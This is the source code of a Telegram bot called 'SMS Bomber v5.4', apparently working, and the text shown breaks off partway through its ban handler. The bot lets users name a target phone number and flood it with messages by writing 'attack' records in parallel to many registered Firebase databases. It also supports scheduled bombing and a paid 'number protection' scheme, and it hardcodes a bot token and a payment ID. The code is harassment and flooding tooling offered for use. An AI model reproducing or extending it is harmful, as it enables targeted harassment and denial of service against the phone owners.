"""
✨ ꜱᴍꜱ ʙᴏᴍʙᴇʀ ᴠ5.4 — ᴄʏʙᴇʀ ᴇᴅɪᴛɪᴏɴ ✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• ᴀᴜᴛᴏ-ᴅɪꜱᴄᴏᴠᴇʀ ᴀʟʟ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ ꜰʀᴏᴍ ᴀʟʟ ꜰɪʀᴇʙᴀꜱᴇꜱ
• ᴘᴀʀᴀʟʟᴇʟ ꜱᴇɴᴅ ᴀᴄʀᴏꜱꜱ ᴀʟʟ ᴅᴇᴠɪᴄᴇꜱ ꜱɪᴍᴜʟᴛᴀɴᴇᴏᴜꜱʟʏ
• ꜱᴄʜᴇᴅᴜʟᴇ ʙᴏᴍʙɪɴɢ (ᴍɪɴᴜᴛᴇꜱ, ʜᴏᴜʀꜱ, ᴅᴀʏꜱ) - ᴀᴜᴛᴏ ᴇxᴇᴄᴜᴛɪᴏɴ
• ᴇxᴀᴄᴛ ꜱᴍꜱ ᴄᴏᴜɴᴛ ᴅᴇʟɪᴠᴇʀʏ (Max 500)
• ꜰɪʀᴇʙᴀꜱᴇ ʜɪᴅᴅᴇɴ ꜰʀᴏᴍ ᴜꜱᴇʀꜱ
• 🌌 ꜱᴍᴀʟʟ ᴄᴀᴘꜱ ᴜɪ, ᴀɴɪᴍᴀᴛɪᴏɴꜱ & ꜰᴏʀᴄᴇ ᴊᴏɪɴ
• 🛡️ ɴᴜᴍʙᴇʀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ꜱʏꜱᴛᴇᴍ
• 💾 ᴅᴀᴛᴀʙᴀꜱᴇ ʙᴀᴄᴋᴜᴘ & ʀᴇꜱᴛᴏʀᴇ
• 📊 ᴅᴀɪʟʏ ʙᴏᴍʙ ʟɪᴍɪᴛ (10 ᴘᴇʀ ᴅᴀʏ)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
import asyncio, json, os, re, time, logging, random
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import aiohttp
from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import FSInputFile

# ════════════════════════════════════════════════════════════
# LOGGING
# ════════════════════════════════════════════════════════════
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s — %(message)s")
log = logging.getLogger("SMSBomber")

# ════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════
BOT_TOKEN = "8805382482:AAH5Qv9OTM0Ta3jUmFsKvHHEbd3iKOUGrHE"
OWNER_ID = 8679787798  # Change to your ID
DATA_FILE = "bomber_data.json"
VERSION = "v5.4"
MAX_CONCURRENT = 500
MAX_COUNT = 500  # Updated Limit
DAILY_BOMB_LIMIT = 10  # Users can send only 10 bombs per day

# Hardcoded Force Join Channels (Admin cannot change these via panel)
FORCE_JOIN_CHANNELS = ["@errorarmy1", "@techboosterdiscussion"] 

# Payment Details for Protection
PROTECTION_PRICE = "30 Rs"
PAYMENT_UPI = "8707210511@fam"

# ════════════════════════════════════════════════════════════
# UI & ANIMATION HELPERS
# ════════════════════════════════════════════════════════════
SC_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ',
    'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ',
    'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ', 'u': 'ᴜ',
    'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ'
}

def sc(text: str) -> str:
    """Converts text to small caps while preserving HTML tags and numbers"""
    if not isinstance(text, str): return str(text)
    parts = re.split(r'(<[^>]+>)', text)
    for i in range(0, len(parts), 2):
        parts[i] = "".join(SC_MAP.get(c.lower(), c) for c in parts[i])
    return "".join(parts)

def styled_box(title: str, body: str) -> str:
    return (
        f"╭─── ✧ ─────────────── ✧ ───╮\n"
        f"┃ ✨ {sc(title).upper()}\n"
        f"┣─── ✧ ─────────────── ✧ ───┤\n"
        f"{body}\n"
        f"╰─── ✧ ─────────────── ✧ ───╯"
    )

async def animate_edit(msg: types.Message, text: str, duration: int = 2):
    """Creates a loading spinner animation"""
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    for i in range(duration * 5):
        try:
            await msg.edit_text(f"<code>{frames[i % 10]}</code> {text}", parse_mode="HTML")
        except: pass
        await asyncio.sleep(0.2)

# ════════════════════════════════════════════════════════════
# FORCE JOIN HELPERS
# ════════════════════════════════════════════════════════════
async def check_fj(bot: Bot, user_id: int, channels: list) -> bool:
    if not channels: return True
    for ch in channels:
        try:
            m = await bot.get_chat_member(ch, user_id)
            if m.status in ["left", "kicked", None]: return False
        except: return False
    return True

async def send_fj_ui(event, channels: list):
    text = sc("✨ ᴍᴀɴᴅᴀᴛᴏʀʏ ꜱᴜʙꜱᴄʀɪᴘᴛɪᴏɴ ✨\n\n")
    text += sc("ʏᴏᴜ ᴍᴜꜱᴛ ᴊᴏɪɴ ᴛʜᴇꜱᴇ ᴄʜᴀɴɴᴇʟꜱ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ:\n\n")
    kb = []
    for i, ch in enumerate(channels):
        text += f"🔗 <code>{ch}</code>\n"
        url = f"https://t.me/{ch.replace('@', '')}"
        kb.append([types.InlineKeyboardButton(text=sc(f"📢 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ {i+1}"), url=url)])
    kb.append([types.InlineKeyboardButton(text=sc("🔄 ᴠᴇʀɪꜰʏ ᴍᴇᴍʙᴇʀꜱʜɪᴘ"), callback_data="fj_verify")])
    markup = types.InlineKeyboardMarkup(inline_keyboard=kb)
    if isinstance(event, types.Message):
        await event.answer(text, reply_markup=markup, parse_mode="HTML")
    else:
        await event.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

# ════════════════════════════════════════════════════════════
# FSM STATES
# ════════════════════════════════════════════════════════════
class Form(StatesGroup):
    fb_add_url = State()
    fb_add_api = State()
    fb_bulk_urls = State()          # New: For bulk firebase adding
    bomb_number = State()
    bomb_message = State()
    bomb_count = State()
    schedule_number = State()
    schedule_message = State()
    schedule_count = State()
    schedule_time = State()
    schedule_name = State()
    protect_txn = State()
    protect_number = State()
    admin_give_limit_uid = State()  # New: For giving limit to user

# ════════════════════════════════════════════════════════════
# STORAGE
# ════════════════════════════════════════════════════════════
def default_data():
    return {
        "admins": [OWNER_ID],
        "firebases": [],
        "banned": [],
        "schedules": [],
        "protected_numbers": [],
        "protection_requests": [],
        "user_daily_bombs": {},      # New: Track daily bomb counts {user_id: {date: count, reset_time: timestamp}}
        "stats": {"total_sent": 0, "total_failed": 0, "total_bombings": 0}
    }

def load():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            d = json.load(f)
        for k, v in default_data().items():
            if k not in d: d[k] = v
        return d
    return default_data()

def save(d):
    with open(DATA_FILE, "w") as f:
        json.dump(d, f, indent=2)

def is_admin(uid, d): return uid in d.get("admins", []) or uid == OWNER_ID
def is_banned(uid, d): return uid in d.get("banned", [])

# ════════════════════════════════════════════════════════════
# DAILY BOMB LIMIT HELPERS
# ════════════════════════════════════════════════════════════
def get_user_bomb_count(uid: int, d: dict) -> int:
    """Get today's bomb count for user"""
    today = datetime.now().strftime("%Y-%m-%d")
    user_data = d.get("user_daily_bombs", {}).get(str(uid), {})
    if user_data.get("date") == today:
        return user_data.get("count", 0)
    return 0

def increment_bomb_count(uid: int, d: dict):
    """Increment user's daily bomb count"""
    today = datetime.now().strftime("%Y-%m-%d")
    if "user_daily_bombs" not in d:
        d["user_daily_bombs"] = {}
    
    uid_str = str(uid)
    if uid_str not in d["user_daily_bombs"]:
        d["user_daily_bombs"][uid_str] = {}
    
    if d["user_daily_bombs"][uid_str].get("date") != today:
        d["user_daily_bombs"][uid_str] = {"date": today, "count": 0, "reset_time": int(time.time())}
    
    d["user_daily_bombs"][uid_str]["count"] += 1
    save(d)

def reset_user_limit(uid: int, d: dict):
    """Reset user's daily limit"""
    if "user_daily_bombs" not in d:
        d["user_daily_bombs"] = {}
    d["user_daily_bombs"][str(uid)] = {"date": "", "count": 0, "reset_time": int(time.time())}
    save(d)

def can_bomb(uid: int, d: dict) -> tuple[bool, str]:
    """Check if user can send bombs today. Returns (can_bomb, message)"""
    count = get_user_bomb_count(uid, d)
    if count >= DAILY_BOMB_LIMIT:
        return False, f"❌ {sc('ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ!')} {count}/{DAILY_BOMB_LIMIT}\n\n💭 {sc('ᴛʀʏ ᴛᴏᴍᴏʀʀᴏᴡ!')}"
    return True, f"✅ {sc('ᴀʟʟᴏᴡᴇᴅ:')} {count}/{DAILY_BOMB_LIMIT}"

# ════════════════════════════════════════════════════════════
# KEYBOARD HELPERS
# ════════════════════════════════════════════════════════════
def kb(rows):
    keyboard = []
    for row in rows:
        btn_row = []
        for item in row:
            if isinstance(item, tuple) and len(item) >= 2:
                btn_row.append(types.InlineKeyboardButton(text=item[0], callback_data=item[1]))
            elif isinstance(item, dict):
                btn_row.append(types.InlineKeyboardButton(text=item["text"], callback_data=item["callback"]))
        if btn_row: keyboard.append(btn_row)
    return types.InlineKeyboardMarkup(inline_keyboard=keyboard)

def back_button(callback):
    return kb([[("◀️ " + sc("ʙᴀᴄᴋ"), callback)]])

def admin_panel_kb(d):
    rows = [
        [("🔥 " + sc("ꜰɪʀᴇʙᴀꜱᴇ"), "admin:firebase_menu")],
        [("📅 " + sc("ꜱᴄʜᴇᴅᴜʟᴇ"), "admin:schedule_menu"), ("🚫 " + sc("ʙᴀɴ"), "admin:ban")],
        [("👥 " + sc("ᴀᴅᴍɪɴꜱ"), "admin:admins"), ("🔓 " + sc("ᴜɴʙᴀɴ"), "admin:unban")],
        [("💾 " + sc("ʙᴀᴄᴋᴜᴘ"), "admin:backup"), ("📂 " + sc("ʀᴇꜱᴛᴏʀᴇ"), "admin:restore")],
        [("📊 " + sc("ꜱᴛᴀᴛꜱ"), "admin:stats"), ("🎁 " + sc("ɢɪᴠᴇ ʟɪᴍɪᴛ"), "admin:give_limit")],
        [("❌ " + sc("ᴄʟᴏꜱᴇ"), "close")]
    ]
    return kb(rows)

# ════════════════════════════════════════════════════════════
# FIREBASE HELPERS
# ════════════════════════════════════════════════════════════
async def fb_get(base: str, path: str, api_key: str = "") -> dict:
    url = base.rstrip("/") + path
    if api_key: url += f"?auth={api_key}"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=15) as r:
                if r.status == 200:
                    txt = await r.text()
                    return {} if txt == "null" or txt == "" else json.loads(txt)
    except Exception as e: log.error(f"fb_get error: {e}")
    return {}

async def fb_put(base: str, path: str, payload: dict, api_key: str = "") -> bool:
    url = base.rstrip("/") + path
    if api_key: url += f"?auth={api_key}"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.put(url, json=payload, timeout=15) as r:
                return r.status == 200
    except Exception as e: log.error(f"fb_put error: {e}")
    return False

# ════════════════════════════════════════════════════════════
# ROUTER
# ════════════════════════════════════════════════════════════
R = Router()

# ════════════════════════════════════════════════════════════
# INITIALIZATION
# ════════════════════════════════════════════════════════════
SCHEDULER_TASK = None

async def start_scheduler(bot: Bot):
    global SCHEDULER_TASK
    SCHEDULER_TASK = asyncio.create_task(schedule_loop(bot))

async def stop_scheduler():
    if SCHEDULER_TASK:
        SCHEDULER_TASK.cancel()

async def schedule_loop(bot: Bot):
    while True:
        try:
            d = load()
            now = time.time()
            remaining = []
            for sched in d.get("schedules", []):
                if sched.get("execute_at", 0) <= now:
                    try:
                        user_id = sched.get("user_id")
                        number = sched.get("number")
                        message = sched.get("message", "Test")
                        count = sched.get("count", 1)
                        fbs = d.get("firebases", [])
                        if fbs and not is_banned(user_id, d):
                            tasks = []
                            for fb in fbs:
                                tasks.append(fb_put(fb.get("url"), f"/devices/{number}.json", {"message": message}, fb.get("api_key", "")))
                            results = await asyncio.gather(*tasks, return_exceptions=True)
                            d["stats"]["total_sent"] += sum(1 for r in results if r)
                            d["stats"]["total_failed"] += sum(1 for r in results if not r)
                            d["stats"]["total_bombings"] += 1
                            save(d)
                            log.info(f"Scheduled bombing executed: {number}")
                        await bot.send_message(user_id, f"✅ {sc('ꜱᴄʜᴇᴅᴜʟᴇ ᴇxᴇᴄᴜᴛᴇᴅ!')} {number}")
                    except Exception as e:
                        log.error(f"Schedule execution error: {e}")
                else:
                    remaining.append(sched)
            d["schedules"] = remaining
            save(d)
        except Exception as e:
            log.error(f"Scheduler error: {e}")
        await asyncio.sleep(60)

# ════════════════════════════════════════════════════════════
# START COMMAND
# ════════════════════════════════════════════════════════════
@R.message(Command("start"))
async def cmd_start(msg: types.Message):
    uid = msg.from_user.id
    d = load()
    
    if is_banned(uid, d):
        await msg.answer(sc("🚫 ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ!"))
        return
    
    if not await check_fj(msg.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(msg, FORCE_JOIN_CHANNELS)
        return
    
    if is_admin(uid, d):
        await msg.answer(styled_box("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", f"👑 {sc('ᴡᴇʟᴄᴏᴍᴇ ᴀᴅᴍɪɴ')}\n\n{sc('ᴛᴀᴘ ᴀ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ')}\n\n📊 {sc('ᴠᴇʀꜱɪᴏɴ')}: {VERSION}"), parse_mode="HTML", reply_markup=admin_panel_kb(d))
    else:
        text = styled_box("ꜱᴍꜱ ʙᴏᴍʙᴇʀ", f"🎯 {sc('ᴇɴᴛᴇʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ')}\n\n<i>{sc('ᴘʀɪᴠᴀᴛᴇ ᴍᴇꜱꜱᴀɢᴇ ᴀɴᴅ ꜱᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ')}</i>")
        await msg.answer(text, parse_mode="HTML", reply_markup=kb([[("🚀 " + sc("ꜱᴛᴀʀᴛ ʙᴏᴍʙɪɴɢ"), "start_bomb")]]))

# ════════════════════════════════════════════════════════════
# USER PANEL - BOMBING
# ════════════════════════════════════════════════════════════
@R.callback_query(F.data == "start_bomb")
async def cb_start_bomb(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    
    if is_banned(uid, d):
        await cq.answer(sc("🚫 ʙᴀɴɴᴇᴅ!"), show_alert=True)
        return
    
    # Check daily limit
    can_send, msg_text = can_bomb(uid, d)
    if not can_send:
        await cq.answer(msg_text, show_alert=True)
        return
    
    await state.set_state(Form.bomb_number)
    await cq.message.edit_text(
        styled_box("ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ", f"{sc('ᴇɴᴛᴇʀ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ')}\n\n<code>+91XXXXXXXXXX</code>\n\n<i>{sc('ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ')}</i>"),
        reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "start")]]), parse_mode="HTML")

@R.message(Form.bomb_number)
async def process_bomb_number(msg: types.Message, state: FSMContext):
    number = msg.text.strip()
    if not re.match(r"^\+?91?\d{9,10}$", number):
        await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!"))
        return
    await state.update_data(bomb_number=number)
    await state.set_state(Form.bomb_count)
    await msg.answer(sc("🔢 ʜᴏᴡ ᴍᴀɴʏ ꜱᴍꜱ? (1-50)\n\n<i>ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ</i>"), parse_mode="HTML", reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "start")]]​))

@R.message(Form.bomb_count)
async def process_bomb_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > 50:
            await msg.answer(sc("❌ ᴇɴᴛᴇʀ ᴀ ɴᴜᴍʙᴇʀ ʙᴇᴛᴡᴇᴇɴ 1 ᴀɴᴅ 50!"))
            return
        data = await state.get_data()
        uid = msg.from_user.id
        d = load()
        
        # Check and increment bomb count
        increment_bomb_count(uid, d)
        
        fbs = d.get("firebases", [])
        if not fbs:
            await msg.answer(sc("❌ ɴᴏ ꜰɪʀᴇʙᴀꜱᴇ ᴄᴏɴꜰɪɢᴜʀᴇᴅ!"))
            await state.clear()
            return
        
        number = data.get("bomb_number")
        loading_msg = await msg.answer(f"<code>⠋</code> {sc('ꜱᴇɴᴅɪɴɢ ᴀᴛᴛᴀᴄᴋ...')}", parse_mode="HTML")
        
        tasks = []
        for fb in fbs:
            for _ in range(count):
                tasks.append(fb_put(fb.get("url"), f"/devices/{number}.json", {"attack": True, "timestamp": int(time.time())}, fb.get("api_key", "")))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success = sum(1 for r in results if r is True)
        
        d["stats"]["total_sent"] += success
        d["stats"]["total_failed"] += len(results) - success
        d["stats"]["total_bombings"] += 1
        save(d)
        
        await loading_msg.edit_text(
            styled_box("ᴀᴛᴛᴀᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ", f"✅ {sc('ꜱᴇɴᴛ')}: <b>{success}</b>\n❌ {sc('ꜰᴀɪʟᴇᴅ')}: <b>{len(results) - success}</b>\n\n🎯 {sc('ᴛᴀʀɢᴇᴛ')}: <code>{number}</code>"),
            parse_mode="HTML", reply_markup=kb([[("🏠 " + sc("ʜᴏᴍᴇ"), "start")]])
        )
        
        await state.clear()
    except ValueError:
        await msg.answer(sc("❌ ᴇɴᴛᴇʀ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!"))

# ════════════════════════════════════════════════════════════
# ADMIN PANEL - FIREBASE MANAGEMENT
# ════════════════════════════════════════════════════════════

@R.callback_query(F.data == "admin:firebase_menu")
async def cb_firebase_menu(cq: types.CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer(sc("🚫 ᴀᴅᴍɪɴ ᴏɴʟʏ!"), show_alert=True)
        return
    
    fbs_count = len(d.get("firebases", []))
    text = styled_box("ꜰɪʀᴇʙᴀꜱᴇ ᴍᴇɴᴜ", f"📊 {sc('ᴄᴜʀʀᴇɴᴛ ɴᴏᴅᴇꜱ')}: <b>{fbs_count}</b>/1000\n\n{sc('ꜱᴇʟᴇᴄᴛ ᴀɴ ᴀᴄᴛɪᴏɴ:')}")
    rows = [
        [("➕ " + sc("ᴀᴅᴅ ꜱɪɴɢʟᴇ"), "admin:fb_add"), ("➕➕ " + sc("ᴀᴅᴅ ʙᴜʟᴋ"), "admin:fb_bulk")],
        [("📋 " + sc("ʟɪꜱᴛ"), "admin:fb_list")],
        [("◀️ " + sc("ʙᴀᴄᴋ"), "admin:panel")]
    ]
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")

# ── Add Single Firebase ──────────────────────────────────────
@R.callback_query(F.data == "admin:fb_add")
async def cb_fb_add(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("🚫 ᴀᴅᴍɪɴ ᴏɴʟʏ!"), show_alert=True)
        return
    await state.set_state(Form.fb_add_url)
    await cq.message.edit_text(
        styled_box("ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇ", f"{sc('ꜱᴇɴᴅ ꜰɪʀᴇʙᴀꜱᴇ ᴅᴀᴛᴀʙᴀꜱᴇ ᴜʀʟ')}\n\n<code>https://your-project.firebaseio.com</code>\n\n<i>{sc('ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ')}</i>"),
        reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:firebase_menu")]]), parse_mode="HTML")

@R.message(Form.fb_add_url)
async def process_fb_url(msg: types.Message, state: FSMContext):
    url = msg.text.strip()
    if not url.startswith("https://"):
        await msg.answer(sc("❌ ᴜʀʟ ᴍᴜꜱᴛ ꜱᴛᴀʀᴛ ᴡɪᴛʜ https://"))
        return
    await state.update_data(fb_url=url.rstrip("/"))
    await state.set_state(Form.fb_add_api)
    await msg.answer(sc("🔑 ᴇɴᴛᴇʀ ꜰɪʀᴇʙᴀꜱᴇ ᴀᴘɪ ᴋᴇʏ\n\n<i>ꜱᴇɴᴅ 'skip' ᴛᴏ ꜱᴋɪᴘ</i>\n\n<i>ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ</i>"), parse_mode="HTML", reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:firebase_menu")]]))

@R.message(Form.fb_add_api)
async def process_fb_api(msg: types.Message, state: FSMContext):
    api_key = msg.text.strip()
    if api_key.lower() == "skip": api_key = ""
    data = await state.get_data()
    d = load()
    d["firebases"].append({"id": str(int(time.time())), "url": data.get("fb_url"), "api_key": api_key})
    save(d)
    await state.clear()
    await msg.answer(sc("✅ ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇ ᴀᴅᴅᴇᴅ!"), reply_markup=admin_panel_kb(d), parse_mode="HTML")

# ── Add Bulk Firebase ────────────────────────────────────────
@R.callback_query(F.data == "admin:fb_bulk")
async def cb_fb_bulk(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("🚫 ᴀᴅᴍɪɴ ᴏɴʟʏ!"), show_alert=True)
        return
    await state.set_state(Form.fb_bulk_urls)
    await cq.message.edit_text(
        styled_box("ᴀᴅᴅ ʙᴜʟᴋ ꜰɪʀᴇʙᴀꜱᴇ", f"{sc('ꜱᴇɴᴅ ᴜʀʟꜱ, ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ:')}\n\n<code>https://proj1.firebaseio.com</code>\n<code>https://proj2.firebaseio.com</code>\n\n{sc('ᴏᴘᴛɪᴏɴᴀʟ: ᴀᴅᴅ ᴀᴘɪ ᴋᴇʏ ᴀꜰᴛᴇʀ ꜱᴘᴀᴄᴇ:')}\n<code>https://proj.firebaseio.com api_key_here</code>\n\n<i>{sc('ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ')}</i>"),
        reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:firebase_menu")]]), parse_mode="HTML")

@R.message(Form.fb_bulk_urls)
async def process_fb_bulk_urls(msg: types.Message, state: FSMContext):
    d = load()
    lines = msg.text.strip().split("\n")
    added_count = 0
    skipped_count = 0
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        parts = line.split()
        url = parts[0]
        api_key = parts[1] if len(parts) > 1 else ""
        
        if not url.startswith("https://"):
            skipped_count += 1
            continue
        
        d["firebases"].append({"id": str(int(time.time() * 1000) + added_count), "url": url.rstrip("/"), "api_key": api_key})
        added_count += 1
    
    save(d)
    await state.clear()
    
    result_text = f"✅ {sc('ᴀᴅᴅᴇᴅ')}: <b>{added_count}</b>\n"
    if skipped_count > 0:
        result_text += f"⚠️ {sc('ꜱᴋɪᴘᴘᴇᴅ')}: <b>{skipped_count}</b>"
    
    await msg.answer(styled_box("ʙᴜʟᴋ ᴀᴅᴅ ᴄᴏᴍᴘʟᴇᴛᴇ", result_text), reply_markup=admin_panel_kb(d), parse_mode="HTML")

# ── List Firebases ────────────────────────────────────────
@R.callback_query(F.data == "admin:fb_list")
async def cb_fb_list(cq: types.CallbackQuery):
    d = load()
    fbs = d.get("firebases", [])
    if not fbs:
        await cq.answer(sc("❌ ɴᴏ ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇꜱ ᴀᴅᴅᴇᴅ!"), show_alert=True)
        return
    
    # Show in chunks if too many
    chunks = [fbs[i:i+10] for i in range(0, len(fbs), 10)]
    text = styled_box("ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇꜱ", f"📊 {sc('ᴛᴏᴛᴀʟ')}: <b>{len(fbs)}</b>\n\n" + "\n".join([f"🔥 {sc('ɴᴏᴅᴇ')} #{i+1} 🔑 {'✅' if fb.get('api_key') else '❌'}" for i, fb in enumerate(chunks[0])]))
    rows = [[(f"🗑 {sc('ᴅᴇʟᴇᴛᴇ')} #{i+1}", f"admin:fb_del:{fb['id']}") for i, fb in enumerate(chunks[0])]]
    rows.append([("◀️ " + sc("ʙᴀᴄᴋ"), "admin:firebase_menu")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:fb_del:"))
async def cb_fb_del(cq: types.CallbackQuery):
    fb_id = cq.data.split(":")[2]
    d = load()
    d["firebases"] = [fb for fb in d.get("firebases", []) if fb["id"] != fb_id]
    save(d)
    await cq.answer(sc("🗑 ɴᴏᴅᴇ ᴅᴇʟᴇᴛᴇᴅ!"), show_alert=True)
    await cb_fb_list(cq)

# ════════════════════════════════════════════════════════════
# ADMIN PANEL - SCHEDULE MENU
# ════════════════════════════════════════════════════════════
@R.callback_query(F.data == "admin:schedule_menu")
async def cb_schedule_menu(cq: types.CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer(sc("🚫 ᴀᴅᴍɪɴ ᴏɴʟʏ!"), show_alert=True)
        return
    
    text = styled_box("ꜱᴄʜᴇᴅᴜʟᴇ ᴍᴇɴᴜ", f"{sc('ᴛᴏᴛᴀʟ ꜱᴄʜᴇᴅᴜʟᴇꜱ')}: <b>{len(d.get('schedules', []))}</b>\n\n{sc('ꜱᴇʟᴇᴄᴛ ᴀɴ ᴀᴄᴛɪᴏɴ:')}")
    rows = [
        [("✏️ " + sc("ᴠɪᴇᴡ"), "admin:schedule_view")],
        [("◀️ " + sc("ʙᴀᴄᴋ"), "admin:panel")]
    ]
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data == "admin:schedule_view")
async def cb_schedule_view(cq: types.CallbackQuery):
    d = load()
    scheds = d.get("schedules", [])
    if not scheds:
        await cq.answer(sc("❌ ɴᴏ ꜱᴄʜᴇᴅᴜʟᴇꜱ!"), show_alert=True)
        return
    
    text = styled_box("ᴀᴄᴛɪᴠᴇ ꜱᴄʜᴇᴅᴜʟᴇꜱ", "\n".join([f"📅 {sched.get('name', 'Unknown')} → {sched.get('number')}" for sched in scheds[:5]]))
    rows = [[(f"🗑 {sc('ᴅᴇʟᴇᴛᴇ')} {sched.get('name')}", f"admin:sched_del:{sched['id']}") for sched in scheds]]
    rows.append([("◀️ " + sc("ʙᴀᴄᴋ"), "admin:schedule_menu")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:sched_del:"))
async def cb_sched_del(cq: types.CallbackQuery):
    sched_id = cq.data.split(":")[2]
    d = load()
    d["schedules"] = [s for s in d.get("schedules", []) if s.get("id") != sched_id]
    save(d)
    await cq.answer(sc("✅ ᴅᴇʟᴇᴛᴇᴅ!"), show_alert=True)
    await cb_schedule_view(cq)

# ════════════════════════════════════════════════════════════
# ADMIN PANEL - GIVE LIMIT (NEW)
# ════════════════════════════════════════════════════════════
@R.callback_query(F.data == "admin:give_limit")
async def cb_give_limit(cq: types.CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer(sc("🚫 ᴀᴅᴍɪɴ ᴏɴʟʏ!"), show_alert=True)
        return
    
    await state.set_state(Form.admin_give_limit_uid)
    await cq.message.edit_text(
        styled_box("ɢɪᴠᴇ ʟɪᴍɪᴛ", f"{sc('ᴇɴᴛᴇʀ ᴜꜱᴇʀ ɪᴅ ᴛᴏ ʀᴇꜱᴇᴛ ᴅᴀɪʟʏ ʙᴏᴍʙ ʟɪᴍɪᴛ:')}\n\n{sc('ᴜꜱᴇʀ ᴄᴀɴ ꜱᴇɴᴅ 10 ʙᴏᴍʙꜱ ᴀɢᴀɪɴ')}\n\n<i>{sc('ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ')}</i>"),
        reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:panel")]]), parse_mode="HTML")

@R.message(Form.admin_give_limit_uid)
async def process_give_limit(msg: types.Message, state: FSMContext):
    try:
        uid = int(msg.text.strip())
        d = load()
        reset_user_limit(uid, d)
        await state.clear()
        await msg.answer(f"✅ {sc('ʟɪᴍɪᴛ ʀᴇꜱᴇᴛ!')}\n\n👤 <code>{uid}</code>\n💣 {sc('ᴄᴀɴ ɴᴏᴡ ꜱᴇɴᴅ 10 ʙᴏᴍʙꜱ ᴀɢᴀɪɴ')}", parse_mode="HTML", reply_markup=admin_panel_kb(d))
    except:
        await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ!"))

# ════════════════════════════════════════════════════════════
# ADMIN PANEL - BAN/UNBAN
# ════════════════════════════════════════════════════════════
@R.callback_query(F.data == "admin:ban")
async def cb_ban(cq: types.CallbackQuery, state: FSMContext):
